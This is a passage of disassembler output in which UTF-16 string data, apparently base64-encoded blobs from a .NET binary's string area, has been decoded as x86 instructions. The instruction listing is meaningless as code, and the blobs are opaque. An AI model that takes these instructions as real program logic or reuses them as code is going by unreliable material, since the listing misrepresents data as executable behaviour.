  40b104:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b107:	7a 00                	jp     0x40b109
  40b109:	50                   	push   %eax
  40b10a:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40b10e:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40b112:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  40b116:	00 35 00 6c 00 6f    	add    %dh,0x6f006c00
  40b11c:	00 30                	add    %dh,(%eax)
  40b11e:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40b122:	00 45 00             	add    %al,0x0(%ebp)
  40b125:	52                   	push   %edx
  40b126:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40b12a:	00 2f                	add    %ch,(%edi)
  40b12c:	00 33                	add    %dh,(%ebx)
  40b12e:	00 53 00             	add    %dl,0x0(%ebx)
  40b131:	50                   	push   %eax
  40b132:	00 33                	add    %dh,(%ebx)
  40b134:	00 5a 00             	add    %bl,0x0(%edx)
  40b137:	4c                   	dec    %esp
  40b138:	00 59 00             	add    %bl,0x0(%ecx)
  40b13b:	35 00 65 00 2b       	xor    $0x2b006500,%eax
  40b140:	00 48 00             	add    %cl,0x0(%eax)
  40b143:	67 00 66 00          	add    %ah,0x0(%bp)
  40b147:	73 00                	jae    0x40b149
  40b149:	4b                   	dec    %ebx
  40b14a:	00 30                	add    %dh,(%eax)
  40b14c:	00 36                	add    %dh,(%esi)
  40b14e:	00 57 00             	add    %dl,0x0(%edi)
  40b151:	62 00                	bound  %eax,(%eax)
  40b153:	4e                   	dec    %esi
  40b154:	00 4a 00             	add    %cl,0x0(%edx)
  40b157:	7a 00                	jp     0x40b159
  40b159:	43                   	inc    %ebx
  40b15a:	00 52 00             	add    %dl,0x0(%edx)
  40b15d:	6c                   	insb   (%dx),%es:(%edi)
  40b15e:	00 36                	add    %dh,(%esi)
  40b160:	00 69 00             	add    %ch,0x0(%ecx)
  40b163:	66 00 64 00 36       	data16 add %ah,0x36(%eax,%eax,1)
  40b168:	00 2f                	add    %ch,(%edi)
  40b16a:	00 70 00             	add    %dh,0x0(%eax)
  40b16d:	6a 00                	push   $0x0
  40b16f:	63 00                	arpl   %eax,(%eax)
  40b171:	73 00                	jae    0x40b173
  40b173:	70 00                	jo     0x40b175
  40b175:	6c                   	insb   (%dx),%es:(%edi)
  40b176:	00 42 00             	add    %al,0x0(%edx)
  40b179:	6b 00 46             	imul   $0x46,(%eax),%eax
  40b17c:	00 68 00             	add    %ch,0x0(%eax)
  40b17f:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40b183:	4c                   	dec    %esp
  40b184:	00 41 00             	add    %al,0x0(%ecx)
  40b187:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b18b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b18c:	00 56 00             	add    %dl,0x0(%esi)
  40b18f:	33 00                	xor    (%eax),%eax
  40b191:	46                   	inc    %esi
  40b192:	00 46 00             	add    %al,0x0(%esi)
  40b195:	44                   	inc    %esp
  40b196:	00 49 00             	add    %cl,0x0(%ecx)
  40b199:	48                   	dec    %eax
  40b19a:	00 53 00             	add    %dl,0x0(%ebx)
  40b19d:	35 00 55 00 73       	xor    $0x73005500,%eax
  40b1a2:	00 6a 00             	add    %ch,0x0(%edx)
  40b1a5:	36 00 30             	add    %dh,%ss:(%eax)
  40b1a8:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40b1ac:	00 39                	add    %bh,(%ecx)
  40b1ae:	00 76 00             	add    %dh,0x0(%esi)
  40b1b1:	51                   	push   %ecx
  40b1b2:	00 65 00             	add    %ah,0x0(%ebp)
  40b1b5:	2b 00                	sub    (%eax),%eax
  40b1b7:	48                   	dec    %eax
  40b1b8:	00 76 00             	add    %dh,0x0(%esi)
  40b1bb:	30 00                	xor    %al,(%eax)
  40b1bd:	54                   	push   %esp
  40b1be:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40b1c2:	00 30                	add    %dh,(%eax)
  40b1c4:	00 4f 00             	add    %cl,0x0(%edi)
  40b1c7:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40b1cb:	59                   	pop    %ecx
  40b1cc:	00 46 00             	add    %al,0x0(%esi)
  40b1cf:	42                   	inc    %edx
  40b1d0:	00 37                	add    %dh,(%edi)
  40b1d2:	00 76 00             	add    %dh,0x0(%esi)
  40b1d5:	49                   	dec    %ecx
  40b1d6:	00 48 00             	add    %cl,0x0(%eax)
  40b1d9:	4e                   	dec    %esi
  40b1da:	00 77 00             	add    %dh,0x0(%edi)
  40b1dd:	55                   	push   %ebp
  40b1de:	00 62 00             	add    %ah,0x0(%edx)
  40b1e1:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40b1e5:	75 00                	jne    0x40b1e7
  40b1e7:	69 00 35 00 4b 00    	imul   $0x4b0035,(%eax),%eax
  40b1ed:	4a                   	dec    %edx
  40b1ee:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40b1f2:	00 6a 00             	add    %ch,0x0(%edx)
  40b1f5:	72 00                	jb     0x40b1f7
  40b1f7:	77 00                	ja     0x40b1f9
  40b1f9:	7a 00                	jp     0x40b1fb
  40b1fb:	73 00                	jae    0x40b1fd
  40b1fd:	7a 00                	jp     0x40b1ff
  40b1ff:	46                   	inc    %esi
  40b200:	00 52 00             	add    %dl,0x0(%edx)
  40b203:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40b207:	52                   	push   %edx
  40b208:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  40b20c:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40b210:	00 63 00             	add    %ah,0x0(%ebx)
  40b213:	6b 00 72             	imul   $0x72,(%eax),%eax
  40b216:	00 78 00             	add    %bh,0x0(%eax)
  40b219:	6c                   	insb   (%dx),%es:(%edi)
  40b21a:	00 55 00             	add    %dl,0x0(%ebp)
  40b21d:	38 00                	cmp    %al,(%eax)
  40b21f:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40b223:	54                   	push   %esp
  40b224:	00 63 00             	add    %ah,0x0(%ebx)
  40b227:	56                   	push   %esi
  40b228:	00 49 00             	add    %cl,0x0(%ecx)
  40b22b:	54                   	push   %esp
  40b22c:	00 63 00             	add    %ah,0x0(%ebx)
  40b22f:	34 00                	xor    $0x0,%al
  40b231:	31 00                	xor    %eax,(%eax)
  40b233:	4f                   	dec    %edi
  40b234:	00 5a 00             	add    %bl,0x0(%edx)
  40b237:	49                   	dec    %ecx
  40b238:	00 32                	add    %dh,(%edx)
  40b23a:	00 6a 00             	add    %ch,0x0(%edx)
  40b23d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b23e:	00 46 00             	add    %al,0x0(%esi)
  40b241:	48                   	dec    %eax
  40b242:	00 47 00             	add    %al,0x0(%edi)
  40b245:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40b249:	4f                   	dec    %edi
  40b24a:	00 36                	add    %dh,(%esi)
  40b24c:	00 45 00             	add    %al,0x0(%ebp)
  40b24f:	69 00 52 00 39 00    	imul   $0x390052,(%eax),%eax
  40b255:	67 00 4f 00          	add    %cl,0x0(%bx)
  40b259:	30 00                	xor    %al,(%eax)
  40b25b:	72 00                	jb     0x40b25d
  40b25d:	73 00                	jae    0x40b25f
  40b25f:	4d                   	dec    %ebp
  40b260:	00 32                	add    %dh,(%edx)
  40b262:	00 48 00             	add    %cl,0x0(%eax)
  40b265:	6f                   	outsl  %ds:(%esi),(%dx)
  40b266:	00 42 00             	add    %al,0x0(%edx)
  40b269:	37                   	aaa
  40b26a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b26d:	48                   	dec    %eax
  40b26e:	00 49 00             	add    %cl,0x0(%ecx)
  40b271:	74 00                	je     0x40b273
  40b273:	46                   	inc    %esi
  40b274:	00 31                	add    %dh,(%ecx)
  40b276:	00 4d 00             	add    %cl,0x0(%ebp)
  40b279:	68 00 4b 00 4d       	push   $0x4d004b00
  40b27e:	00 70 00             	add    %dh,0x0(%eax)
  40b281:	34 00                	xor    $0x0,%al
  40b283:	4b                   	dec    %ebx
  40b284:	00 30                	add    %dh,(%eax)
  40b286:	00 52 00             	add    %dl,0x0(%edx)
  40b289:	4a                   	dec    %edx
  40b28a:	00 75 00             	add    %dh,0x0(%ebp)
  40b28d:	62 00                	bound  %eax,(%eax)
  40b28f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b290:	00 57 00             	add    %dl,0x0(%edi)
  40b293:	42                   	inc    %edx
  40b294:	00 72 00             	add    %dh,0x0(%edx)
  40b297:	69 00 50 00 75 00    	imul   $0x750050,(%eax),%eax
  40b29d:	30 00                	xor    %al,(%eax)
  40b29f:	52                   	push   %edx
  40b2a0:	00 5a 00             	add    %bl,0x0(%edx)
  40b2a3:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b2a7:	72 00                	jb     0x40b2a9
  40b2a9:	30 00                	xor    %al,(%eax)
  40b2ab:	53                   	push   %ebx
  40b2ac:	00 56 00             	add    %dl,0x0(%esi)
  40b2af:	56                   	push   %esi
  40b2b0:	00 6e 00             	add    %ch,0x0(%esi)
  40b2b3:	5a                   	pop    %edx
  40b2b4:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40b2b8:	00 65 00             	add    %ah,0x0(%ebp)
  40b2bb:	31 00                	xor    %eax,(%eax)
  40b2bd:	79 00                	jns    0x40b2bf
  40b2bf:	76 00                	jbe    0x40b2c1
  40b2c1:	79 00                	jns    0x40b2c3
  40b2c3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2c4:	00 51 00             	add    %dl,0x0(%ecx)
  40b2c7:	59                   	pop    %ecx
  40b2c8:	00 73 00             	add    %dh,0x0(%ebx)
  40b2cb:	63 00                	arpl   %eax,(%eax)
  40b2cd:	39 00                	cmp    %eax,(%eax)
  40b2cf:	38 00                	cmp    %al,(%eax)
  40b2d1:	6c                   	insb   (%dx),%es:(%edi)
  40b2d2:	00 6e 00             	add    %ch,0x0(%esi)
  40b2d5:	49                   	dec    %ecx
  40b2d6:	00 61 00             	add    %ah,0x0(%ecx)
  40b2d9:	42                   	inc    %edx
  40b2da:	00 39                	add    %bh,(%ecx)
  40b2dc:	00 39                	add    %bh,(%ecx)
  40b2de:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40b2e2:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b2e6:	00 6e 00             	add    %ch,0x0(%esi)
  40b2e9:	35 00 43 00 6e       	xor    $0x6e004300,%eax
  40b2ee:	00 2b                	add    %ch,(%ebx)
  40b2f0:	00 2b                	add    %ch,(%ebx)
  40b2f2:	00 76 00             	add    %dh,0x0(%esi)
  40b2f5:	51                   	push   %ecx
  40b2f6:	00 56 00             	add    %dl,0x0(%esi)
  40b2f9:	57                   	push   %edi
  40b2fa:	00 68 00             	add    %ch,0x0(%eax)
  40b2fd:	73 00                	jae    0x40b2ff
  40b2ff:	4e                   	dec    %esi
  40b300:	00 71 00             	add    %dh,0x0(%ecx)
  40b303:	4d                   	dec    %ebp
  40b304:	00 6e 00             	add    %ch,0x0(%esi)
  40b307:	74 00                	je     0x40b309
  40b309:	74 00                	je     0x40b30b
  40b30b:	48                   	dec    %eax
  40b30c:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40b310:	00 59 00             	add    %bl,0x0(%ecx)
  40b313:	59                   	pop    %ecx
  40b314:	00 50 00             	add    %dl,0x0(%eax)
  40b317:	50                   	push   %eax
  40b318:	00 41 00             	add    %al,0x0(%ecx)
  40b31b:	49                   	dec    %ecx
  40b31c:	00 45 00             	add    %al,0x0(%ebp)
  40b31f:	61                   	popa
  40b320:	00 68 00             	add    %ch,0x0(%eax)
  40b323:	51                   	push   %ecx
  40b324:	00 4e 00             	add    %cl,0x0(%esi)
  40b327:	49                   	dec    %ecx
  40b328:	00 76 00             	add    %dh,0x0(%esi)
  40b32b:	33 00                	xor    (%eax),%eax
  40b32d:	76 00                	jbe    0x40b32f
  40b32f:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40b333:	41                   	inc    %ecx
  40b334:	00 58 00             	add    %bl,0x0(%eax)
  40b337:	35 00 51 00 38       	xor    $0x38005100,%eax
  40b33c:	00 42 00             	add    %al,0x0(%edx)
  40b33f:	79 00                	jns    0x40b341
  40b341:	4c                   	dec    %esp
  40b342:	00 67 00             	add    %ah,0x0(%edi)
  40b345:	50                   	push   %eax
  40b346:	00 58 00             	add    %bl,0x0(%eax)
  40b349:	61                   	popa
  40b34a:	00 6f 00             	add    %ch,0x0(%edi)
  40b34d:	39 00                	cmp    %eax,(%eax)
  40b34f:	72 00                	jb     0x40b351
  40b351:	31 00                	xor    %eax,(%eax)
  40b353:	2b 00                	sub    (%eax),%eax
  40b355:	4f                   	dec    %edi
  40b356:	00 6b 00             	add    %ch,0x0(%ebx)
  40b359:	46                   	inc    %esi
  40b35a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b35d:	7a 00                	jp     0x40b35f
  40b35f:	77 00                	ja     0x40b361
  40b361:	39 00                	cmp    %eax,(%eax)
  40b363:	77 00                	ja     0x40b365
  40b365:	45                   	inc    %ebp
  40b366:	00 4a 00             	add    %cl,0x0(%edx)
  40b369:	2b 00                	sub    (%eax),%eax
  40b36b:	4f                   	dec    %edi
  40b36c:	00 52 00             	add    %dl,0x0(%edx)
  40b36f:	6b 00 55             	imul   $0x55,(%eax),%eax
  40b372:	00 55 00             	add    %dl,0x0(%ebp)
  40b375:	63 00                	arpl   %eax,(%eax)
  40b377:	45                   	inc    %ebp
  40b378:	00 2b                	add    %ch,(%ebx)
  40b37a:	00 73 00             	add    %dh,0x0(%ebx)
  40b37d:	75 00                	jne    0x40b37f
  40b37f:	63 00                	arpl   %eax,(%eax)
  40b381:	72 00                	jb     0x40b383
  40b383:	46                   	inc    %esi
  40b384:	00 70 00             	add    %dh,0x0(%eax)
  40b387:	35 00 6f 00 2f       	xor    $0x2f006f00,%eax
  40b38c:	00 62 00             	add    %ah,0x0(%edx)
  40b38f:	78 00                	js     0x40b391
  40b391:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b395:	73 00                	jae    0x40b397
  40b397:	51                   	push   %ecx
  40b398:	00 31                	add    %dh,(%ecx)
  40b39a:	00 48 00             	add    %cl,0x0(%eax)
  40b39d:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40b3a1:	71 00                	jno    0x40b3a3
  40b3a3:	73 00                	jae    0x40b3a5
  40b3a5:	36 00 6c 00 46       	add    %ch,%ss:0x46(%eax,%eax,1)
  40b3aa:	00 37                	add    %dh,(%edi)
  40b3ac:	00 49 00             	add    %cl,0x0(%ecx)
  40b3af:	51                   	push   %ecx
  40b3b0:	00 67 00             	add    %ah,0x0(%edi)
  40b3b3:	59                   	pop    %ecx
  40b3b4:	00 47 00             	add    %al,0x0(%edi)
  40b3b7:	2f                   	das
  40b3b8:	00 31                	add    %dh,(%ecx)
  40b3ba:	00 4f 00             	add    %cl,0x0(%edi)
  40b3bd:	47                   	inc    %edi
  40b3be:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40b3c2:	00 55 00             	add    %dl,0x0(%ebp)
  40b3c5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3c6:	00 59 00             	add    %bl,0x0(%ecx)
  40b3c9:	32 00                	xor    (%eax),%al
  40b3cb:	59                   	pop    %ecx
  40b3cc:	00 6b 00             	add    %ch,0x0(%ebx)
  40b3cf:	33 00                	xor    (%eax),%eax
  40b3d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3d2:	00 6b 00             	add    %ch,0x0(%ebx)
  40b3d5:	52                   	push   %edx
  40b3d6:	00 4b 00             	add    %cl,0x0(%ebx)
  40b3d9:	52                   	push   %edx
  40b3da:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40b3de:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  40b3e2:	00 31                	add    %dh,(%ecx)
  40b3e4:	00 6e 00             	add    %ch,0x0(%esi)
  40b3e7:	7a 00                	jp     0x40b3e9
  40b3e9:	7a 00                	jp     0x40b3eb
  40b3eb:	5a                   	pop    %edx
  40b3ec:	00 30                	add    %dh,(%eax)
  40b3ee:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3f1:	50                   	push   %eax
  40b3f2:	00 6e 00             	add    %ch,0x0(%esi)
  40b3f5:	59                   	pop    %ecx
  40b3f6:	00 50 00             	add    %dl,0x0(%eax)
  40b3f9:	37                   	aaa
  40b3fa:	00 6e 00             	add    %ch,0x0(%esi)
  40b3fd:	71 00                	jno    0x40b3ff
  40b3ff:	49                   	dec    %ecx
  40b400:	00 68 00             	add    %ch,0x0(%eax)
  40b403:	59                   	pop    %ecx
  40b404:	00 30                	add    %dh,(%eax)
  40b406:	00 59 00             	add    %bl,0x0(%ecx)
  40b409:	71 00                	jno    0x40b40b
  40b40b:	6d                   	insl   (%dx),%es:(%edi)
  40b40c:	00 73 00             	add    %dh,0x0(%ebx)
  40b40f:	7a 00                	jp     0x40b411
  40b411:	68 00 32 00 30       	push   $0x30003200
  40b416:	00 46 00             	add    %al,0x0(%esi)
  40b419:	4c                   	dec    %esp
  40b41a:	00 70 00             	add    %dh,0x0(%eax)
  40b41d:	71 00                	jno    0x40b41f
  40b41f:	63 00                	arpl   %eax,(%eax)
  40b421:	70 00                	jo     0x40b423
  40b423:	49                   	dec    %ecx
  40b424:	00 58 00             	add    %bl,0x0(%eax)
  40b427:	62 00                	bound  %eax,(%eax)
  40b429:	4e                   	dec    %esi
  40b42a:	00 6e 00             	add    %ch,0x0(%esi)
  40b42d:	55                   	push   %ebp
  40b42e:	00 47 00             	add    %al,0x0(%edi)
  40b431:	6f                   	outsl  %ds:(%esi),(%dx)
  40b432:	00 4e 00             	add    %cl,0x0(%esi)
  40b435:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40b439:	5a                   	pop    %edx
  40b43a:	00 70 00             	add    %dh,0x0(%eax)
  40b43d:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40b441:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40b444:	00 32                	add    %dh,(%edx)
  40b446:	00 4d 00             	add    %cl,0x0(%ebp)
  40b449:	54                   	push   %esp
  40b44a:	00 39                	add    %bh,(%ecx)
  40b44c:	00 4e 00             	add    %cl,0x0(%esi)
  40b44f:	63 00                	arpl   %eax,(%eax)
  40b451:	6e                   	outsb  %ds:(%esi),(%dx)
  40b452:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40b456:	00 45 00             	add    %al,0x0(%ebp)
  40b459:	31 00                	xor    %eax,(%eax)
  40b45b:	50                   	push   %eax
  40b45c:	00 53 00             	add    %dl,0x0(%ebx)
  40b45f:	56                   	push   %esi
  40b460:	00 4b 00             	add    %cl,0x0(%ebx)
  40b463:	6f                   	outsl  %ds:(%esi),(%dx)
  40b464:	00 69 00             	add    %ch,0x0(%ecx)
  40b467:	4b                   	dec    %ebx
  40b468:	00 68 00             	add    %ch,0x0(%eax)
  40b46b:	55                   	push   %ebp
  40b46c:	00 6a 00             	add    %ch,0x0(%edx)
  40b46f:	4a                   	dec    %edx
  40b470:	00 4f 00             	add    %cl,0x0(%edi)
  40b473:	72 00                	jb     0x40b475
  40b475:	41                   	inc    %ecx
  40b476:	00 75 00             	add    %dh,0x0(%ebp)
  40b479:	6a 00                	push   $0x0
  40b47b:	38 00                	cmp    %al,(%eax)
  40b47d:	4c                   	dec    %esp
  40b47e:	00 31                	add    %dh,(%ecx)
  40b480:	00 2f                	add    %ch,(%edi)
  40b482:	00 4b 00             	add    %cl,0x0(%ebx)
  40b485:	71 00                	jno    0x40b487
  40b487:	54                   	push   %esp
  40b488:	00 2f                	add    %ch,(%edi)
  40b48a:	00 63 00             	add    %ah,0x0(%ebx)
  40b48d:	43                   	inc    %ebx
  40b48e:	00 70 00             	add    %dh,0x0(%eax)
  40b491:	6d                   	insl   (%dx),%es:(%edi)
  40b492:	00 4b 00             	add    %cl,0x0(%ebx)
  40b495:	4c                   	dec    %esp
  40b496:	00 48 00             	add    %cl,0x0(%eax)
  40b499:	44                   	inc    %esp
  40b49a:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40b49e:	00 57 00             	add    %dl,0x0(%edi)
  40b4a1:	75 00                	jne    0x40b4a3
  40b4a3:	46                   	inc    %esi
  40b4a4:	00 35 00 46 00 38    	add    %dh,0x38004600
  40b4aa:	00 4f 00             	add    %cl,0x0(%edi)
  40b4ad:	72 00                	jb     0x40b4af
  40b4af:	32 00                	xor    (%eax),%al
  40b4b1:	39 00                	cmp    %eax,(%eax)
  40b4b3:	33 00                	xor    (%eax),%eax
  40b4b5:	74 00                	je     0x40b4b7
  40b4b7:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b4bb:	4c                   	dec    %esp
  40b4bc:	00 4b 00             	add    %cl,0x0(%ebx)
  40b4bf:	2f                   	das
  40b4c0:	00 77 00             	add    %dh,0x0(%edi)
  40b4c3:	6b 00 56             	imul   $0x56,(%eax),%eax
  40b4c6:	00 4a 00             	add    %cl,0x0(%edx)
  40b4c9:	77 00                	ja     0x40b4cb
  40b4cb:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b4d0:	80 b1 65 00 74 00 77 	xorb   $0x77,0x740065(%ecx)
  40b4d7:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4da:	52                   	push   %edx
  40b4db:	00 78 00             	add    %bh,0x0(%eax)
  40b4de:	6d                   	insl   (%dx),%es:(%edi)
  40b4df:	00 58 00             	add    %bl,0x0(%eax)
  40b4e2:	4f                   	dec    %edi
  40b4e3:	00 57 00             	add    %dl,0x0(%edi)
  40b4e6:	69 00 4d 00 45 00    	imul   $0x45004d,(%eax),%eax
  40b4ec:	4f                   	dec    %edi
  40b4ed:	00 47 00             	add    %al,0x0(%edi)
  40b4f0:	46                   	inc    %esi
  40b4f1:	00 38                	add    %bh,(%eax)
  40b4f3:	00 68 00             	add    %ch,0x0(%eax)
  40b4f6:	52                   	push   %edx
  40b4f7:	00 35 00 6f 00 64    	add    %dh,0x64006f00
  40b4fd:	00 5a 00             	add    %bl,0x0(%edx)
  40b500:	72 00                	jb     0x40b502
  40b502:	6a 00                	push   $0x0
  40b504:	71 00                	jno    0x40b506
  40b506:	7a 00                	jp     0x40b508
  40b508:	37                   	aaa
  40b509:	00 55 00             	add    %dl,0x0(%ebp)
  40b50c:	7a 00                	jp     0x40b50e
  40b50e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b50f:	00 6a 00             	add    %ch,0x0(%edx)
  40b512:	2f                   	das
  40b513:	00 75 00             	add    %dh,0x0(%ebp)
  40b516:	43                   	inc    %ebx
  40b517:	00 32                	add    %dh,(%edx)
  40b519:	00 31                	add    %dh,(%ecx)
  40b51b:	00 32                	add    %dh,(%edx)
  40b51d:	00 6a 00             	add    %ch,0x0(%edx)
  40b520:	2f                   	das
  40b521:	00 68 00             	add    %ch,0x0(%eax)
  40b524:	77 00                	ja     0x40b526
  40b526:	68 00 7a 00 62       	push   $0x62007a00
  40b52b:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40b52f:	00 59 00             	add    %bl,0x0(%ecx)
  40b532:	47                   	inc    %edi
  40b533:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40b537:	00 66 00             	add    %ah,0x0(%esi)
  40b53a:	54                   	push   %esp
  40b53b:	00 55 00             	add    %dl,0x0(%ebp)
  40b53e:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40b542:	66 00 31             	data16 add %dh,(%ecx)
  40b545:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40b549:	00 38                	add    %bh,(%eax)
  40b54b:	00 37                	add    %dh,(%edi)
  40b54d:	00 57 00             	add    %dl,0x0(%edi)
  40b550:	32 00                	xor    (%eax),%al
  40b552:	4b                   	dec    %ebx
  40b553:	00 76 00             	add    %dh,0x0(%esi)
  40b556:	51                   	push   %ecx
  40b557:	00 4a 00             	add    %cl,0x0(%edx)
  40b55a:	2f                   	das
  40b55b:	00 6e 00             	add    %ch,0x0(%esi)
  40b55e:	66 00 38             	data16 add %bh,(%eax)
  40b561:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40b565:	00 73 00             	add    %dh,0x0(%ebx)
  40b568:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40b56c:	51                   	push   %ecx
  40b56d:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40b571:	00 4a 00             	add    %cl,0x0(%edx)
  40b574:	66 00 31             	data16 add %dh,(%ecx)
  40b577:	00 55 00             	add    %dl,0x0(%ebp)
  40b57a:	6a 00                	push   $0x0
  40b57c:	41                   	inc    %ecx
  40b57d:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b583:	80 b1 71 00 66 00 61 	xorb   $0x61,0x660071(%ecx)
  40b58a:	00 6e 00             	add    %ch,0x0(%esi)
  40b58d:	4f                   	dec    %edi
  40b58e:	00 30                	add    %dh,(%eax)
  40b590:	00 56 00             	add    %dl,0x0(%esi)
  40b593:	2b 00                	sub    (%eax),%eax
  40b595:	78 00                	js     0x40b597
  40b597:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40b59b:	79 00                	jns    0x40b59d
  40b59d:	50                   	push   %eax
  40b59e:	00 52 00             	add    %dl,0x0(%edx)
  40b5a1:	6d                   	insl   (%dx),%es:(%edi)
  40b5a2:	00 67 00             	add    %ah,0x0(%edi)
  40b5a5:	57                   	push   %edi
  40b5a6:	00 55 00             	add    %dl,0x0(%ebp)
  40b5a9:	6d                   	insl   (%dx),%es:(%edi)
  40b5aa:	00 6f 00             	add    %ch,0x0(%edi)
  40b5ad:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5ae:	00 46 00             	add    %al,0x0(%esi)
  40b5b1:	53                   	push   %ebx
  40b5b2:	00 49 00             	add    %cl,0x0(%ecx)
  40b5b5:	55                   	push   %ebp
  40b5b6:	00 37                	add    %dh,(%edi)
  40b5b8:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  40b5bc:	00 56 00             	add    %dl,0x0(%esi)
  40b5bf:	39 00                	cmp    %eax,(%eax)
  40b5c1:	6c                   	insb   (%dx),%es:(%edi)
  40b5c2:	00 35 00 36 00 4f    	add    %dh,0x4f003600
  40b5c8:	00 46 00             	add    %al,0x0(%esi)
  40b5cb:	2f                   	das
  40b5cc:	00 41 00             	add    %al,0x0(%ecx)
  40b5cf:	2b 00                	sub    (%eax),%eax
  40b5d1:	74 00                	je     0x40b5d3
  40b5d3:	52                   	push   %edx
  40b5d4:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  40b5d8:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40b5dc:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40b5e0:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  40b5e4:	00 51 00             	add    %dl,0x0(%ecx)
  40b5e7:	45                   	inc    %ebp
  40b5e8:	00 46 00             	add    %al,0x0(%esi)
  40b5eb:	7a 00                	jp     0x40b5ed
  40b5ed:	61                   	popa
  40b5ee:	00 31                	add    %dh,(%ecx)
  40b5f0:	00 63 00             	add    %ah,0x0(%ebx)
  40b5f3:	4c                   	dec    %esp
  40b5f4:	00 63 00             	add    %ah,0x0(%ebx)
  40b5f7:	78 00                	js     0x40b5f9
  40b5f9:	6a 00                	push   $0x0
  40b5fb:	53                   	push   %ebx
  40b5fc:	00 2f                	add    %ch,(%edi)
  40b5fe:	00 49 00             	add    %cl,0x0(%ecx)
  40b601:	61                   	popa
  40b602:	00 35 00 50 00 47    	add    %dh,0x47005000
  40b608:	00 66 00             	add    %ah,0x0(%esi)
  40b60b:	39 00                	cmp    %eax,(%eax)
  40b60d:	2b 00                	sub    (%eax),%eax
  40b60f:	44                   	inc    %esp
  40b610:	00 45 00             	add    %al,0x0(%ebp)
  40b613:	74 00                	je     0x40b615
  40b615:	31 00                	xor    %eax,(%eax)
  40b617:	73 00                	jae    0x40b619
  40b619:	61                   	popa
  40b61a:	00 77 00             	add    %dh,0x0(%edi)
  40b61d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b61e:	00 4f 00             	add    %cl,0x0(%edi)
  40b621:	57                   	push   %edi
  40b622:	00 7a 00             	add    %bh,0x0(%edx)
  40b625:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40b629:	70 00                	jo     0x40b62b
  40b62b:	4c                   	dec    %esp
  40b62c:	00 31                	add    %dh,(%ecx)
  40b62e:	00 41 00             	add    %al,0x0(%ecx)
  40b631:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b636:	80 b1 39 00 64 00 4e 	xorb   $0x4e,0x640039(%ecx)
  40b63d:	00 33                	add    %dh,(%ebx)
  40b63f:	00 7a 00             	add    %bh,0x0(%edx)
  40b642:	76 00                	jbe    0x40b644
  40b644:	4b                   	dec    %ebx
  40b645:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40b649:	00 6a 00             	add    %ch,0x0(%edx)
  40b64c:	71 00                	jno    0x40b64e
  40b64e:	6a 00                	push   $0x0
  40b650:	68 00 52 00 5a       	push   $0x5a005200
  40b655:	00 51 00             	add    %dl,0x0(%ecx)
  40b658:	31 00                	xor    %eax,(%eax)
  40b65a:	32 00                	xor    (%eax),%al
  40b65c:	58                   	pop    %eax
  40b65d:	00 48 00             	add    %cl,0x0(%eax)
  40b660:	48                   	dec    %eax
  40b661:	00 37                	add    %dh,(%edi)
